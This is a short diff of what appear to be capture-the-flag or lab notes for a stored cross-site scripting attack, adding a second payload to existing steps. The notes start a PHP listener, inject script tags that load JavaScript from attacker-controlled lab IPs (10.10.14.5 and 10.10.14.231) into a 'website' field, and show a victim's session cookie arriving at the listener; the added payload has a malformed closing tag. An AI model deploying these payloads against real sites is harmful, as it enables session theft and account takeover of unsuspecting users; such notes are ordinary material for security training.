@@ -434,6 +434,8 @@ sudo php -S 0.0.0.0:80
 # 3. Deploy attack
 # Vulnerable field: website
 # Payload: <script src=http://10.10.14.5/script.js></script>
+or "><script src=http://10.10.14.231/script.js></src>
+
 
 # 4. Wait for victim
 # Terminal shows: /script.js, then /index.php?c=session=abc123
